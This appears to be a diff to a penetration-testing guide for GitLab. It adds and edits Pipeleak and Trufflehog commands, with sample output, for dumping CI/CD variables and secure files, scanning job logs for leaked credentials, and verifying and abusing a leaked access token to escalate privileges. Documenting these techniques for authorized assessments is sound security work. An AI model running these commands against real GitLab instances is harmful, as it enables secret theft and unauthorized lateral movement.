@@ -21,6 +21,8 @@ Some companies grant their developers `developer` access to each repository, thi
 
 The main question: Is the access concept based on the least privilege principle?
 
+> To create a Personal Access Token visit https://leakycompany.com/-/user_settings/personal_access_tokens
+
 ## Known Vulnerabilities
 
 Usually GitLab does disclose the installed version to auhtenticated users only.
@@ -37,14 +39,17 @@ pipeleak vuln -g https://leakycompany.com -t glpat-[redacted]
 
 ## Enumerating CI/CD Variables And Secure Files
 If you already have access to projects and groups you can try to enumerate CI/CD variables and use these for potential privilege escalation/lateral movement paths.
-Using Pipeleak:
-```bash
-pipeleak variables -g https://leakycompany.com -t glpat-[redacted]
-```
 
-And enumerating the secure files:
+Dump all CI/CD variables you have access to, to find more secrets.
 ```bash
-pipeleaksecureFiles  --gitlab https://leakycompany.com --token glpat-[redacted]
+# Dump variables defined in the projects settings
+pipeleak variables -g https://leakycompany.com -t glpat-[redacted]
+
+# Schedules can have separately defined variables
+pipeleak schedule -g https://leakycompany.com -t glpat-[redacted]
+
+# Secure files are an alternative to variables and often times contain sensitive info
+pipeleak secureFiles  --gitlab https://leakycompany.com --token glpat-[redacted]
 2024-11-18T15:38:08Z INF Fetching project variables
 2024-11-18T15:38:09Z WRN Secure file content="this is a secure file!!" downloadUrl=https://leakycompany.com/api/v4/projects/60367314/secure_files/9149327/download
 2024-11-18T15:38:12Z INF Fetched all secure files
@@ -53,12 +58,10 @@ pipeleaksecureFiles  --gitlab https://leakycompany.com --token glpat-[redacted]
 ## Secret Detection in Source Code
 Manually looking for sensitive info can be cumbersome and should be partially automated.
 
-Use Trufflehog to find secrets in the source code:
+Use Trufflehog to find hardcoded secrets in the source code:
 ```bash
 trufflehog gitlab --token=glpat-[redacted]
 ```
-
-> To create a Personal Access Token https://leakycompany.com/-/user_settings/personal_access_tokens
 
 Note this only scanned repository you have access to. You can specify single repositories as well.
 
@@ -68,7 +71,7 @@ Nowadays most repositories make use of CI/CD pipelines. A config file per reposi
 
 Many problems can arise when misconfiguring these.
 
-* People print sensitive environment variables in the public job logs
+* People print sensitive environment variables in the (sometimes public) job logs
 * Debug logs contain sensitive information e.g. private keys or personal access tokens
 * Created Artifacts contain sensitive stuff
 
@@ -125,7 +128,7 @@ There are many reasons why credentials might be included in the job output. More
 
 **Automating Pipeline Credential Leaks**
 
-The tool [pipleak](https://github.com/CompassSecurity/pipeleak) can be used to scan for credentials in the job outputs.
+[Pipleak](https://github.com/CompassSecurity/pipeleak) can be used to scan for credentials in the job outputs.
 
 ```bash
 $ pipeleak scan --token glpat-[redacted] --gitlab https://gitlab.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high 
@@ -170,12 +173,23 @@ curl --request GET --header "PRIVATE-TOKEN: glpat-[removed]" https://gitlab.com/
 
 {
   "id": [removed],
-  "username": "[removed]",
-  "name": "CI_REPO_TOKEN",
+  "username": "pipeleak_user",
+  "name": "testToken",
   "state": "active",
   "locked": false,
   [removed]
 }
+
+# Verify using Pipeleak
+pipeleak enum -g https://gitlab.com -t glpat-[removed]
+2025-09-29T12:25:51Z INF Enumerating User
+2025-09-29T12:25:51Z WRN Current user admin=false bot=false email=test@example.com name="Pipe Leak" username=pipeleak_user
+2025-09-29T12:25:51Z INF Enumerating Access Token
+2025-09-29T12:25:51Z WRN Current Token active=true created=2025-09-29T12:25:20Z description=test id=14839115 lastUsedAt=2025-09-29T12:25:51Z lastUsedIps= name=testToken revoked=false scopes=read_api userId=14918432
+2025-09-29T12:25:51Z INF Enumerating Projects and Groups
+2025-09-29T12:25:52Z WRN Group accessLevel=50 group=https://gitlab.com/groups/example-group name=example-project visibility=private
+2025-09-29T12:25:52Z WRN Project groupAccessLevel=50 name="example-group / another project" project=https://gitlab.com/example-group/another-project projectAccessLevel=0
+2025-09-29T12:25:52Z INF Done
 ```
 
 Abusing this access token grants you access to the repository, thus escalating your privileges to this repository.
